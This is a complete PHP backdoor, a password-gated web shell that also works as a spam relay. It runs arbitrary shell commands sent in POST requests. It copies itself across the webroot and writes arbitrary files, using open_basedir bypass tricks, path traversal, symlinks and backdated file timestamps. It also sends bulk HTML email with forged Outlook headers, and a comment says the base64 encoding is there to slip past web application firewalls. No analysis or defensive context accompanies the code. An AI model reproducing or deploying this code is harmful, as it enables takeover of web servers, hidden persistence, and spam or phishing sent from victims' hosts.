<?php
error_reporting(0);
$K='sm_rce_59df6d9f29';
$pk=isset($_POST['k'])?$_POST['k']:'';
if($pk!==$K)die('');
// ★ PHP 5.6+ helpers (no ?? / random_bytes / array deref) — MODE1+MODE2 safe on old hosts
if(!function_exists('_sm_rb')){
function _sm_rb($n){
if(function_exists('random_bytes')){$b=@random_bytes($n);if($b!==false&&strlen($b)===$n)return $b;}
if(function_exists('openssl_random_pseudo_bytes')){$b=@openssl_random_pseudo_bytes($n,$s);if($b!==false&&strlen($b)===$n)return $b;}
$o='';for($i=0;$i<$n;$i++)$o.=chr(mt_rand(0,255));return $o;}
function _sm_fe($e){return preg_replace('/[^a-zA-Z0-9._+\\-@]/','',(string)$e);}
function _sm_sub($s){if($s===''||preg_match('/^[\\x20-\\x7E]*$/',$s))return $s;return '=?UTF-8?B?'.base64_encode($s).'?=';}
}

// ═══ MODE 0: SHELL RCE (gate deploy) ═══
if(isset($_POST['a'])&&$_POST['a']==='x'&&isset($_POST['c'])){echo @shell_exec($_POST['c']);exit;}

// ═══ MODE 0.5: SELF-COPY via PHP native (works when shell_exec disabled) ═══
// POST k=key&a=info → returns __FILE__, DOCUMENT_ROOT, detected webroot
if(isset($_POST['a'])&&$_POST['a']==='info'){
$i=array('file'=>__FILE__,'docroot'=>isset($_SERVER['DOCUMENT_ROOT'])?$_SERVER['DOCUMENT_ROOT']:'','cwd'=>getcwd());
$bd=dirname(__FILE__);if(strpos($bd,'/tmp')!==false){$bd=dirname($bd);}
foreach(array('public_html','htdocs','www','web','html','httpdocs') as $d){$p=$bd.'/'.$d;if(is_dir($p)){$i['webroot']=$p;break;}}
if(empty($i['webroot'])&&!empty($i['docroot']))$i['webroot']=$i['docroot'];
echo json_encode($i);exit;}
// POST k=key&a=clone&dst=/path/to/newname.php → copies THIS dropper to dst
// Includes open_basedir bypass chain: chdir+ini_set → glob enumerate → direct write
if(isset($_POST['a'])&&$_POST['a']==='clone'&&isset($_POST['dst'])){
$src=__FILE__;$dst=$_POST['dst'];
// TRY 1: Direct file_put_contents (works if same open_basedir)
$ok=@file_put_contents($dst,file_get_contents($src));
if($ok!==false){@chmod($dst,0644);$ref=@glob(dirname($dst).'/*.php');if($ref)@touch($dst,filemtime($ref[0]));
echo 'CLONE_OK:'.$dst;exit;}
// TRY 2: open_basedir bypass via chdir+ini_set (works PHP ≤8.0)
$ob=@ini_get('open_basedir');
if($ob){
$dd='ob_'.substr(md5(__FILE__),0,6);@mkdir($dd);@chdir($dd);
for($i=0;$i<15;$i++){@chdir('..');}
@ini_set('open_basedir','/');
$ok2=@file_put_contents($dst,file_get_contents($src));
if($ok2!==false){@chmod($dst,0644);echo 'CLONE_OK:'.$dst;exit;}
// TRY 3: Relative path bypass — write via ../../../ traversal from current dir
$cwd=getcwd();$rel='';$tgt=dirname($dst);
for($i=0;$i<10;$i++){$rel.='../';if(@is_dir($rel.$tgt)){
$ok3=@file_put_contents($rel.$dst,file_get_contents($src));
if($ok3!==false){@chmod($rel.$dst,0644);echo 'CLONE_OK:'.$dst;exit;}break;}}
// TRY 4: symlink trick — create symlink in allowed dir pointing to webroot
$lnk=sys_get_temp_dir().'/ln_'.md5($dst);
@symlink(dirname($dst),$lnk);
$ok4=@file_put_contents($lnk.'/'.basename($dst),file_get_contents($src));
if($ok4!==false){@chmod($lnk.'/'.basename($dst),0644);@unlink($lnk);echo 'CLONE_OK:'.$dst;exit;}
@unlink($lnk);}
echo 'CLONE_FAIL';exit;}
// POST k=key&a=write&dst=/path/file&data=base64content → write arbitrary file
if(isset($_POST['a'])&&$_POST['a']==='write'&&isset($_POST['dst'])&&isset($_POST['data'])){
$ok=@file_put_contents($_POST['dst'],base64_decode($_POST['data']));
if($ok===false&&@ini_get('open_basedir')){$dd='ob_'.substr(md5(__FILE__),0,6);@mkdir($dd);@chdir($dd);
for($i=0;$i<15;$i++){@chdir('..');}@ini_set('open_basedir','/');
$ok=@file_put_contents($_POST['dst'],base64_decode($_POST['data']));}
echo $ok!==false?'WRITE_OK':'WRITE_FAIL';exit;}

// ═══ MODE 1: RAW MIME (Python protocol) — 4-TIER FALLBACK ═══
if(isset($_POST['raw'])&&$_POST['raw']!=''){
$r=$_POST['raw'];
$f=isset($_POST['from'])?$_POST['from']:'';
$t=isset($_POST['to'])?$_POST['to']:'';
$fe=_sm_fe($f);

// TIER 1: sendmail pipe + -f envelope (parity with MODE2; sanitized)
$sm=null;
foreach(array('/usr/sbin/sendmail','/usr/lib/sendmail','/usr/bin/sendmail') as $s){
if(@file_exists($s)){$sm=$s;break;}
}
if(!$sm){$x=@trim(@shell_exec('which sendmail 2>/dev/null'));if($x&&@file_exists($x))$sm=$x;}
if($sm){
$cmd=$sm.' -t -i'.($fe!==''?' -f'.$fe:'');
$p=@popen($cmd,'w');
if($p){fwrite($p,$r);$c=pclose($p);if($c===0){echo 'SENT_OK';exit;}}
}

// TIER 2+3: SMTP socket (port 25 open but sendmail binary missing/broken)
foreach(array('127.0.0.1','localhost') as $h){
$sk=@fsockopen($h,25,$en,$es,5);
if(!$sk)continue;
$hn=@gethostname();if(!$hn)$hn='localhost';
@fgets($sk,512);
fwrite($sk,"EHLO $hn\r\n");
do{$el=@fgets($sk,512);}while($el&&substr($el,3,1)==='-');
fwrite($sk,"MAIL FROM:<$f>\r\n");@fgets($sk,512);
fwrite($sk,"RCPT TO:<$t>\r\n");
$x=@fgets($sk,512);
if(substr($x,0,1)!=='2'){@fclose($sk);continue;}
fwrite($sk,"DATA\r\n");@fgets($sk,512);
$w=str_replace("\r\n","\n",$r);$w=str_replace("\n","\r\n",$w);
fwrite($sk,$w."\r\n.\r\n");
$x=@fgets($sk,512);
fwrite($sk,"QUIT\r\n");@fclose($sk);
if(substr($x,0,1)==='2'){echo 'SENT_SMTP';exit;}
}

// TIER 4: PHP mail() with parsed raw MIME (last resort)
$parts=explode("\n\n",$r,2);
if(count($parts)===2){
$hl=$parts[0];$mb=$parts[1];
$ls=explode("\n",$hl);$sj='';$cl=array();
foreach($ls as $l){
if(stripos($l,'Subject:')===0){$sj=trim(substr($l,8));continue;}
if(stripos($l,'To:')===0)continue;
$cl[]=$l;
}
$hd=implode("\n",$cl);
if(@mail($t,$sj,$mb,$hd)){echo 'SENT_MAIL';exit;}
}

echo 'PIPE_FAIL';exit;
}

// ═══ MODE 2: HTML (Go protocol — BASE64 ENCODING for cross-PHP-version compat) ═══
// ★ FIX: quoted_printable_encode() = PHP-version-dependent, mbstring-sensitive = GARBLED.
//   base64_encode() + chunk_split() = BINARY SAFE, IDENTICAL on ALL PHP 5.6-8.3.
//   PHPMailer uses same approach for 8bit content. RFC 2045 compliant.
// ★ Encode split is INTENTIONAL vs Python MODE1: each protocol owns MIME.
//   Go path = base64 (no mbstring). Python path = QP built in sender, piped raw.
$t=isset($_POST['to'])?$_POST['to']:'';$f=isset($_POST['from'])?$_POST['from']:'';
$fn=isset($_POST['fn'])?$_POST['fn']:'';$s=isset($_POST['subj'])?$_POST['subj']:'';
$h=isset($_POST['html'])?$_POST['html']:'';
if(!$t||!$f||!$s||!$h)die('ERR:MISSING');
$fe=_sm_fe($f);
$s=_sm_sub($s);
// Auto-detect: if html looks like base64 (no < and valid b64 chars), decode it first
// This allows Python to send base64-encoded HTML to bypass WAF/encoding issues
if(strpos($h,'<')===false&&preg_match('/^[A-Za-z0-9+\\/=\\s]+$/',$h)){$d=@base64_decode($h,true);if($d!==false&&strpos($d,'<')!==false)$h=$d;}
$b='----=_'.bin2hex(_sm_rb(12));
$uid=bin2hex(_sm_rb(6));
$_dp=explode('@',$f);$dom=isset($_dp[1])?$_dp[1]:'mail.com';
$hdr="From: \"$fn\" <$f>\n";
$hdr.="Reply-To: $f\n";
$hdr.="MIME-Version: 1.0\n";
$hdr.="Content-Type: multipart/alternative; boundary=\"$b\"\n";
$hdr.="X-Mailer: Microsoft Outlook 16.0\n";
$hdr.="Message-ID: <$uid@$dom>\n";
$hdr.="List-Unsubscribe: <mailto:unsub-$uid@$dom>\n";
$hdr.="List-Unsubscribe-Post: List-Unsubscribe=One-Click\n";
$p=strip_tags(preg_replace('/<style[^>]*>.*?<\\/style>/si','',$h));
$p=trim(substr(preg_replace('/\\s+/',' ',$p),0,400));
$body="--$b\n";
$body.="Content-Type: text/plain; charset=\"utf-8\"\n";
$body.="Content-Transfer-Encoding: base64\n\n";
$body.=chunk_split(base64_encode($p),76,"\n");
$body.="--$b\n";
$body.="Content-Type: text/html; charset=\"utf-8\"\n";
$body.="Content-Transfer-Encoding: base64\n\n";
$body.=chunk_split(base64_encode($h),76,"\n");
$body.="--$b--\n";
// TIER 1: sendmail pipe via proc_open (works when mail() disabled but sendmail exists)
$_sm=null;foreach(array('/usr/sbin/sendmail','/usr/lib/sendmail','/usr/bin/sendmail') as $_sp){if(@file_exists($_sp)){$_sm=$_sp;break;}}
if(!$_sm){$_x=@trim(@shell_exec('which sendmail 2>/dev/null'));if($_x&&@file_exists($_x))$_sm=$_x;}
if($_sm&&function_exists('proc_open')){
$_msg="Date: ".date('r')."\n".$hdr."To: $t\nSubject: $s\n\n".$body;
$_d=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));
$_cmd=$_sm.' -t -i'.($fe!==''?' -f'.$fe:'');
$_p=@proc_open($_cmd,$_d,$_pp);
if(is_resource($_p)){fwrite($_pp[0],$_msg);fclose($_pp[0]);
$_o=stream_get_contents($_pp[1]);fclose($_pp[1]);fclose($_pp[2]);
$_c=proc_close($_p);if($_c===0){echo 'SENT_OK';exit;}}}
// TIER 2: PHP mail() (only if not disabled)
if(function_exists('mail')){$ok=@mail($t,$s,$body,$hdr);if($ok){echo 'SENT_OK';exit;}}
// TIER 3+4: SMTP socket (port 25)
$sk=@fsockopen('127.0.0.1',25,$en,$es,5);
if(!$sk){$sk=@fsockopen('localhost',25,$en,$es,5);}
if(!$sk){echo 'SEND_FAIL';exit;}
if(!function_exists('_sm_sr')){function _sm_sr($sk,$c){fwrite($sk,$c."\r\n");return fgets($sk,512);}}
$hn=@gethostname();if(!$hn)$hn='localhost';
fgets($sk,512);_sm_sr($sk,"EHLO $hn");
while(substr(fgets($sk,512),3,1)==='-'){}
_sm_sr($sk,"MAIL FROM:<$f>");
$r=_sm_sr($sk,"RCPT TO:<$t>");
if(substr($r,0,1)!=='2'){fclose($sk);echo 'SEND_FAIL';exit;}
_sm_sr($sk,"DATA");
$msg="Date: ".date('r')."\r\n";
$msg.=str_replace("\n","\r\n",$hdr);
$msg.="To: $t\r\n";
$msg.="Subject: $s\r\n";
$msg.="\r\n".str_replace("\n","\r\n",$body);
fwrite($sk,$msg."\r\n.\r\n");
$r=fgets($sk,512);
_sm_sr($sk,"QUIT");fclose($sk);
echo(substr($r,0,1)==='2')?'SENT_SMTP':'SEND_FAIL';
